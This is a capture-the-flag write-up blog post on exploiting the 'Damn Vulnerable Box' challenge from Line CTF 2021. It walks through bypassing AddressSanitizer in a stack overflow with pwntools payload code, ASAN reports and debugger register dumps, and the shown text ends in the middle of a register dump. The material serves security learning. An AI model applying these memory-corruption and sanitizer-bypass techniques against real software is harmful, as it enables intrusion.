<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="theme-color" content="#2ecc71">





<title>Line CTF - Damn Vulnerable Box | kileak</title>





<meta name="description" content="Line CTF - Damn Vulnerable Box">


<meta name="keywords" content="linectf, damnvulnerablebox">



<link rel="stylesheet" href="/css/main.css">









<link rel="canonical" href="https://kileak.github.io/ctf/2021/linectf-damn/">
<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />



<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-4PGFKKP0QW');
</script>


<script>base_url = "";</script>

  </head>
  <body class="">

    <main class="main-container">

        <header class="site-header">

  <div class="container txt-center">
    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
      <span></span>
      <span></span>
      <span></span>
    </a>

    <nav class="js-menu sliding-panel-content">
      <ul>
        <li><a href="/">home</a></li>
        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
      </ul>
    </nav>
    <div class="js-menu-screen sliding-panel-fade-screen"></div>

    <a href="/" class="author-thumb dot">
      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
    </a>

    <!--
    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
    </a>
    -->

    
      <h1 class="post-title">Line CTF - Damn Vulnerable Box</h1>
      <p class="post-meta">Mar 21, 2021</p>
    

  </div>

</header>


        <section class="main-content">
          <article class="post">

  <div class="post-content container">
    <blockquote>
  <p>Damn Vulnerable Box
(asan)
<!--break--></p>

  <p>Description</p>

  <p>Damn!</p>

  <p>Attachment: <a href="https://kileak.github.io/assets/linectf21/damn/damn.tar.gz">damn.tar.gz</a> <a href="https://kileak.github.io/assets/linectf21/damn/xpl.py">xpl.py</a></p>

  <p>Team: rbtree fan club</p>
</blockquote>

<figure class="highlight"><pre><code class="language-text" data-lang="text">   
----------------------------------------------
    
   ██████╗  █████╗ ███╗   ███╗███╗   ██╗    
   ██╔══██╗██╔══██╗████╗ ████║████╗  ██║    
   ██║  ██║███████║██╔████╔██║██╔██╗ ██║    
   ██║  ██║██╔══██║██║╚██╔╝██║██║╚██╗██║    
   ██████╔╝██║  ██║██║ ╚═╝ ██║██║ ╚████║    
   ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═══╝    
   
   ██╗   ██╗██╗   ██╗██╗     ███╗   ██╗███████╗██████╗  █████╗ ██████╗ ██╗     ███████╗ 
   ██║   ██║██║   ██║██║     ████╗  ██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██║     ██╔════╝ 
   ██║   ██║██║   ██║██║     ██╔██╗ ██║█████╗  ██████╔╝███████║██████╔╝██║     █████╗   
   ╚██╗ ██╔╝██║   ██║██║     ██║╚██╗██║██╔══╝  ██╔══██╗██╔══██║██╔══██╗██║     ██╔══╝   
    ╚████╔╝ ╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║██║  ██║██████╔╝███████╗███████╗ 
     ╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝
   
   ██████╗  ██████╗ ██╗  ██╗             
   ██╔══██╗██╔═══██╗╚██╗██╔╝             
   ██████╔╝██║   ██║ ╚███╔╝              
   ██╔══██╗██║   ██║ ██╔██╗              
   ██████╔╝╚██████╔╝██╔╝ ██╗             
   ╚═════╝  ╚═════╝ ╚═╝  ╚═╝             
   
----------------------------------------------
                                              
-=[ Short-cut exploit menu ]=-
 
1. Use-after-free
2. Double-free
3. Global Buffer-overflow
4. Stack Buffer-overflow
5. Format string
6. File download
7. NULL ptr access

&gt;</code></pre></figure>

<p>The binary had some bugs “built in”, but most of them were not usable, because it was protected with ASAN and directly failed when executed.</p>

<p>On every option, we’re asked for user input and then the corresponding bug will be triggered.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">-=[ Short-cut exploit menu ]=-
 
1. Use-after-free
2. Double-free
3. Global Buffer-overflow
4. Stack Buffer-overflow
5. Format string
6. File download
7. NULL ptr access

&gt; 1
userinput&gt; AAAABBBBBBBBBB
=================================================================
==6975==ERROR: AddressSanitizer: heap-use-after-free on address 0x607000000020 at pc 0x000000480cfe bp 0x7ffc904dbe30 sp 0x7ffc904db5f0
WRITE of size 15 at 0x607000000020 thread T0
==6975==WARNING: invalid path to external symbolizer!
==6975==WARNING: Failed to use and restart external symbolizer!
    #0 0x480cfd  (/home/kileak/ctf/line/damn/box+0x480cfd)
    #1 0x4c7e04  (/home/kileak/ctf/line/damn/box+0x4c7e04)
    #2 0x7febdcfb4cb1  (/lib/x86_64-linux-gnu/libc.so.6+0x28cb1)
    #3 0x41c47d  (/home/kileak/ctf/line/damn/box+0x41c47d)

0x607000000020 is located 0 bytes inside of 80-byte region [0x607000000020,0x607000000070)
freed by thread T0 here:
    #0 0x49493d  (/home/kileak/ctf/line/damn/box+0x49493d)
    #1 0x4c7de9  (/home/kileak/ctf/line/damn/box+0x4c7de9)
    #2 0x7febdcfb4cb1  (/lib/x86_64-linux-gnu/libc.so.6+0x28cb1)

previously allocated by thread T0 here:
    #0 0x494bbd  (/home/kileak/ctf/line/damn/box+0x494bbd)
    #1 0x4c7dde  (/home/kileak/ctf/line/damn/box+0x4c7dde)
    #2 0x7febdcfb4cb1  (/lib/x86_64-linux-gnu/libc.so.6+0x28cb1)

SUMMARY: AddressSanitizer: heap-use-after-free (/home/kileak/ctf/line/damn/box+0x480cfd) 
Shadow bytes around the buggy address:
  0x0c0e7fff7fb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c0e7fff7fc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c0e7fff7fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c0e7fff7fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c0e7fff7ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=&gt;0x0c0e7fff8000: fa fa fa fa[fd]fd fd fd fd fd fd fd fd fd fa fa
  0x0c0e7fff8010: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c0e7fff8020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c0e7fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c0e7fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c0e7fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==6975==ABORTING</code></pre></figure>

<p>While most of them cannot be turned into something useful, the main <code class="language-plaintext highlighter-rouge">scanf</code>, asking for user input provided on every bug looks promising.</p>

<p>Simply trying to overflow user input, asan detects and aborts it.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>

<span class="n">HOST</span> <span class="o">=</span> <span class="s">"35.221.91.124"</span>
<span class="n">PORT</span> <span class="o">=</span> <span class="mi">10008</span>

<span class="k">def</span> <span class="nf">globuf</span><span class="p">(</span><span class="n">user</span><span class="p">):</span>
	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
	<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="n">user</span><span class="p">)</span>
	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">stack</span><span class="p">(</span><span class="n">user</span><span class="p">):</span>
	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"4"</span><span class="p">)</span>
	<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="n">user</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
		
	<span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>

	<span class="n">stack</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

	<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

	<span class="k">return</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
	<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./box"</span><span class="p">)</span>

	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
		<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">False</span>
		<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
		<span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
		<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./box"</span><span class="p">)</span>
		<span class="k">print</span> <span class="p">(</span><span class="n">util</span><span class="p">.</span><span class="n">proc</span><span class="p">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>
		<span class="n">pause</span><span class="p">()</span>
		<span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] '/home/kileak/ctf/line/damn/box'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    ASAN:     Enabled
    UBSAN:    Enabled
[+] Starting local process './box': pid 7311
[7311]
[*] Paused (press any to continue)
[*] Switching to interactive mode
=================================================================
==7311==ERROR: AddressSanitizer: strcpy-param-overlap: memory ranges [0x7ffd833e1680,0x7ffd833e1a69) and [0x7ffd833e1720, 0x7ffd833e1b09) overlap
==7311==WARNING: invalid path to external symbolizer!
==7311==WARNING: Failed to use and restart external symbolizer!
    #0 0x480a2a  (/home/kileak/ctf/line/damn/box+0x480a2a)
    #1 0x4c7e7e  (/home/kileak/ctf/line/damn/box+0x4c7e7e)
    #2 0x7fe44ab28cb1  (/lib/x86_64-linux-gnu/libc.so.6+0x28cb1)
    #3 0x41c47d  (/home/kileak/ctf/line/damn/box+0x41c47d)

Address 0x7ffd833e1680 is located in stack of thread T0 at offset 32 in frame
    #0 0x4c7b7f  (/home/kileak/ctf/line/damn/box+0x4c7b7f)

  This frame has 3 object(s):
    [32, 160) 'local_buf.i' &lt;== Memory access at offset 32 partially overflows this variable
    [192, 1216) 'buf' &lt;== Memory access at offset 32 partially underflows this variable
    [1344, 1348) 'm'
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
Address 0x7ffd833e1720 is located in stack of thread T0 at offset 192 in frame
    #0 0x4c7b7f  (/home/kileak/ctf/line/damn/box+0x4c7b7f)

  This frame has 3 object(s):
    [32, 160) 'local_buf.i'
    [192, 1216) 'buf' &lt;== Memory access at offset 192 is inside this variable
    [1344, 1348) 'm'
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: strcpy-param-overlap (/home/kileak/ctf/line/damn/box+0x480a2a) 
==7311==ABORTING</code></pre></figure>

<p>This happens because our user input will be copied via <code class="language-plaintext highlighter-rouge">strcpy</code>, where asan detects the overflow.</p>

<p>But, if our user input contains a null byte before the overflowing data, <code class="language-plaintext highlighter-rouge">strcpy</code> will not rise an asan exception anymore and the binary will just try to cleanup the asan stack and exit.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x48</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mi">3000</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">Program received signal SIGSEGV, Segmentation fault.
0x00000000004c7f99 in main ()
───────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x42346f42336f4232 ("2Bo3Bo4B"?)
$rbx   : 0x00007fffffffddc0  →  "Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo[...]"
$rcx   : 0x00000000ffffdd03  →  0x0000000000000000
$rdx   : 0x80              
$rsp   : 0x00007fffffffd860  →  0x0000000041b58ab3
$rbp   : 0x00007fffffffde60  →  "s5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1[...]"
$rsi   : 0xf8              
$rdi   : 0x000010007fff7b24  →  0xf8f8f8f8f8f8f8f8
$rip   : 0x00000000004c7f99  →  &lt;main+1065&gt; mov QWORD PTR [rax], 0x45e0360e
$r8    : 0x00007fffffffd6f0  →  0x0000000000000000
$r9    : 0x0               
$r10   : 0x00007ffff7b403c0  →  0x0002000200020002
$r11   : 0x246             
$r12   : 0x00007fffffffdda0  →  "m1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7[...]"
$r13   : 0x00000000ffffffff  →  0x0000000000000000
$r14   : 0x000010007fff7b0c  →  0xf8f8f8f8f1f1f1f1
$r15   : 0x00000ffffffffbb4  →  0x0000000000000000
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
─────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4c7f8b &lt;main+1051&gt;      mov    esi, 0x80
     0x4c7f90 &lt;main+1056&gt;      call   0x4978e0 &lt;__asan_set_shadow_f8&gt;
     0x4c7f95 &lt;main+1061&gt;      mov    rax, QWORD PTR [rbx+0x20]
 →   0x4c7f99 &lt;main+1065&gt;      mov    QWORD PTR [rax], 0x45e0360e
     0x4c7fa0 &lt;main+1072&gt;      mov    rdi, QWORD PTR [rbx+0x28]
     0x4c7fa4 &lt;main+1076&gt;      test   rdi, rdi
     0x4c7fa7 &lt;main+1079&gt;      je     0x4c7fb5 &lt;main+1093&gt;
     0x4c7fa9 &lt;main+1081&gt;      mov    esi, 0x560
     0x4c7fae &lt;main+1086&gt;      call   0x42ab10 &lt;__asan_stack_free_5&gt;
───────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffd860│+0x0000: 0x0000000041b58ab3	 ← $rsp
0x00007fffffffd868│+0x0008: 0x00000000004dd569  →  "3 32 128 11 local_buf.i 192 1024 3 buf 1344 4 1 m"
0x00007fffffffd870│+0x0010: 0x00000000004c7b70  →  &lt;main+0&gt; push rbp
0x00007fffffffd878│+0x0018: 0x00007ffff6b10e60  →  0x00007ffff7da8035  →  "GLIBC_2.2.5"
0x00007fffffffd880│+0x0020: 0x0000000000401f8c  →  0x23ea6d8c0d39ad3d
0x00007fffffffd888│+0x0028: 0x00007ffff7fd9b3a  →   add rsp, 0x30
────────────────────────────────────────────────────────────────────────────────────────────────────</code></pre></figure>

<p>The cleanup though will still segfault, because <code class="language-plaintext highlighter-rouge">rax</code> cannot be dereferenced. So, let’s put a valid pointer there.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">0x00000000004c7fae in ?? ()
───────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00000000004fb5c0  →  0x0000000045e0360e
$rbx   : 0x00007fffffffddc0  →  0x6e42336e42326e42 ("Bn2Bn3Bn"?)
$rcx   : 0x00000000ffffdd03  →  0x0000000000000000
$rdx   : 0x80              
$rsp   : 0x00007fffffffd860  →  0x0000000041b58ab3
$rbp   : 0x00007fffffffde60  →  "Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af[...]"
$rsi   : 0x560             
$rdi   : 0x6141316141306141 ("Aa0Aa1Aa"?)
$rip   : 0x00000000004c7fae  →   call 0x42ab10
$r8    : 0x00007fffffffd6f0  →  0x0000000000000000
$r9    : 0x0               
$r10   : 0x00007ffff7b403c0  →  0x0002000200020002
$r11   : 0x246             
$r12   : 0x00007fffffffdda0  →  "m1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7[...]"
$r13   : 0x00000000ffffffff  →  0x0000000000000000
$r14   : 0x000010007fff7b0c  →  0xf8f8f8f8f1f1f1f1
$r15   : 0x00000ffffffffbb4  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
─────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4c7fa4                  test   rdi, rdi
     0x4c7fa7                  je     0x4c7fb5
     0x4c7fa9                  mov    esi, 0x560
 →   0x4c7fae                  call   0x42ab10
   ↳    0x42ab10                  push   rax
        0x42ab11                  mov    rax, QWORD PTR [rdi+0x7f8]
        0x42ab18                  mov    BYTE PTR [rax], 0x0
        0x42ab1b                  cmp    rdi, 0x7fff8000
        0x42ab22                  jb     0x42abe6
        0x42ab28                  lea    rax, [rip+0xe7fe1]        # 0x512b10</code></pre></figure>

<p>We’re passing the check, and the binary will now try to call <code class="language-plaintext highlighter-rouge">_asan_stack_free_5(v0x6141316141306141 0x560);</code>, which then will segfault on</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">Program received signal SIGSEGV, Segmentation fault.
0x000000000042ab11 in __asan_stack_free_5 ()
───────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00000000004fb5c0  →  0x0000000045e0360e
$rbx   : 0x00007fffffffddc0  →  0x6e42336e42326e42 ("Bn2Bn3Bn"?)
$rcx   : 0x00000000ffffdd03  →  0x0000000000000000
$rdx   : 0x80              
$rsp   : 0x00007fffffffd850  →  0x00000000004fb5c0  →  0x0000000045e0360e
$rbp   : 0x00007fffffffde60  →  "Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af[...]"
$rsi   : 0x560             
$rdi   : 0x6141316141306141 ("Aa0Aa1Aa"?)
$rip   : 0x000000000042ab11  →  &lt;__asan_stack_free_5+1&gt; mov rax, QWORD PTR [rdi+0x7f8]
$r8    : 0x00007fffffffd6f0  →  0x0000000000000000
$r9    : 0x0               
$r10   : 0x00007ffff7b403c0  →  0x0002000200020002
$r11   : 0x246             
$r12   : 0x00007fffffffdda0  →  "m1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7[...]"
$r13   : 0x00000000ffffffff  →  0x0000000000000000
$r14   : 0x000010007fff7b0c  →  0xf8f8f8f8f1f1f1f1
$r15   : 0x00000ffffffffbb4  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
─────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x42ab08 &lt;__asan_stack_malloc_5+936&gt; call   0x4b1240 &lt;_ZN11__sanitizer11CheckFailedEPKciS1_yy&gt;
     0x42ab0d                  nop    DWORD PTR [rax]
     0x42ab10 &lt;__asan_stack_free_5+0&gt; push   rax
 →   0x42ab11 &lt;__asan_stack_free_5+1&gt; mov    rax, QWORD PTR [rdi+0x7f8]
     0x42ab18 &lt;__asan_stack_free_5+8&gt; mov    BYTE PTR [rax], 0x0
     0x42ab1b &lt;__asan_stack_free_5+11&gt; cmp    rdi, 0x7fff8000
     0x42ab22 &lt;__asan_stack_free_5+18&gt; jb     0x42abe6 &lt;__asan_stack_free_5+214&gt;
     0x42ab28 &lt;__asan_stack_free_5+24&gt; lea    rax, [rip+0xe7fe1]        # 0x512b10 &lt;_ZN6__asan10kMidMemBegE&gt;
     0x42ab2f &lt;__asan_stack_free_5+31&gt; mov    rsi, QWORD PTR [rax]
───────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffd850│+0x0000: 0x00000000004fb5c0  →  0x0000000045e0360e	 ← $rsp
0x00007fffffffd858│+0x0008: 0x00000000004c7fb3  →  &lt;main+1091&gt; jmp 0x4c7fc2 &lt;main+1106&gt;
0x00007fffffffd860│+0x0010: 0x0000000041b58ab3
0x00007fffffffd868│+0x0018: 0x00000000004dd569  →  "3 32 128 11 local_buf.i 192 1024 3 buf 1344 4 1 m"
0x00007fffffffd870│+0x0020: 0x00000000004c7b70  →  &lt;main+0&gt; push rbp
0x00007fffffffd878│+0x0028: 0x00007ffff6b10e60  →  0x00007ffff7da8035  →  "GLIBC_2.2.5"
────────────────────────────────────────────────────────────────────────────────────────────────────</code></pre></figure>

<p>Since we control <code class="language-plaintext highlighter-rouge">rdi</code>, this could also be used as a null byte write (by the following <code class="language-plaintext highlighter-rouge">mov BYTE PTR [rax], 0x0</code>). If we put an address in memory and point <code class="language-plaintext highlighter-rouge">rdi</code> to that address - <code class="language-plaintext highlighter-rouge">0x7f8</code>, it would just write one null byte there.</p>

<p>But for now, let’s just point it to some address, to avoid the segfault.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x48</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mi">1208</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4fb5c0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xe24aa0</span><span class="o">-</span><span class="mh">0x7f8</span><span class="p">)</span>						<span class="c1"># _Z12pagefilenameB5cxx11
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mi">3000</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] '/home/kileak/ctf/line/damn/box'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    ASAN:     Enabled
    UBSAN:    Enabled
[+] Starting local process './box': pid 9250
[9250]
[*] Paused (press any to continue)
[*] Switching to interactive mode
*** stack smashing detected ***: terminated</code></pre></figure>

<p>Ok, no more asan failures, seems we got around asan and only failed because we overwrote the canary, which resulted in a normal stack smashing detection.</p>

<p>If we could only leak the canary, this would have already been finished. But didn’t find any leaks, so we have to find another way around this.</p>

<p>Noticed then, that it doesn’t seem to execute the <code class="language-plaintext highlighter-rouge">strcpy</code> at all anymore, let’s check the <code class="language-plaintext highlighter-rouge">switch</code> case, what went wrong there.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">───────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x6d42316c        
$rbx   : 0x00007fffffffddc0  →  0x6e42336e42326e42 ("Bn2Bn3Bn"?)
$rcx   : 0x00000000ffffdd03  →  0x0000000000000000
$rdx   : 0x1               
$rsp   : 0x00007fffffffd860  →  0x0000000041b58ab3
$rbp   : 0x00007fffffffde60  →  "d7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3[...]"
$rsi   : 0x1               
$rdi   : 0x00007fffffffd920  →  0x0000000000000048 ("H"?)
$rip   : 0x00000000004c7dc5  →  &lt;main+597&gt; cmp eax, 0x6
$r8    : 0x00007fffffffd6f0  →  0x0000000000000000
$r9    : 0x0               
$r10   : 0x00007ffff7b403c0  →  0x0002000200020002
$r11   : 0x246             
$r12   : 0x00007fffffffdda0  →  "m1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7[...]"
$r13   : 0x0               
$r14   : 0x000010007fff7b0c  →  0xf8f8f8f8f1f1f1f1
$r15   : 0x00000ffffffffbb4  →  0x0000000000000000
$eflags: [zero CARRY PARITY ADJUST sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
─────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4c7db8 &lt;main+584&gt;       jne    0x4c7f40 &lt;main+976&gt;
     0x4c7dbe &lt;main+590&gt;       mov    eax, DWORD PTR [r12]    &lt;== eax coming from r12
     0x4c7dc2 &lt;main+594&gt;       add    eax, 0xffffffff
 →   0x4c7dc5 &lt;main+597&gt;       cmp    eax, 0x6
     0x4c7dc8 &lt;main+600&gt;       ja     0x4c7f7f &lt;main+1039&gt;
     0x4c7dce &lt;main+606&gt;       jmp    QWORD PTR [rax*8+0x4dbec0]
     0x4c7dd5 &lt;main+613&gt;       mov    edi, 0x50
     0x4c7dda &lt;main+618&gt;       call   0x494b20 &lt;malloc&gt;
     0x4c7ddf &lt;main+623&gt;       mov    r14, rax</code></pre></figure>

<p>We’re also overwriting the menu choice, thus just jumping into the <code class="language-plaintext highlighter-rouge">default</code> exitting the application. Let’s fix this, so it will go into the stack overflow block again calling <code class="language-plaintext highlighter-rouge">strcpy</code>.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x48</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mi">1144</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4</span><span class="p">)</span>                             <span class="c1"># menu choice
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mi">1216</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4fb5c0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xe24aa0</span><span class="o">-</span><span class="mh">0x7f8</span><span class="p">)</span>                  <span class="c1"># _Z12pagefilenameB5cxx11
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mi">3000</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">$rax   : 0x3               
$rbx   : 0x00007fffffffddc0  →  0x6241396141386141 ("Aa8Aa9Ab"?)
$rcx   : 0x00000000ffffdd03  →  0x0000000000000000
$rdx   : 0x1               
$rsp   : 0x00007fffffffd860  →  0x0000000041b58ab3
$rbp   : 0x00007fffffffde60  →  "d7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3[...]"
$rsi   : 0x4132624131624130 ("0Ab1Ab2A"?)
$rdi   : 0x6241376241366241 ("Ab6Ab7Ab"?)
$rip   : 0x00000000004c7e7a  →  &lt;main+778&gt; call 0x480970 &lt;strcpy&gt;
$r8    : 0x00007fffffffd6f0  →  0x0000000000000000
$r9    : 0x0               
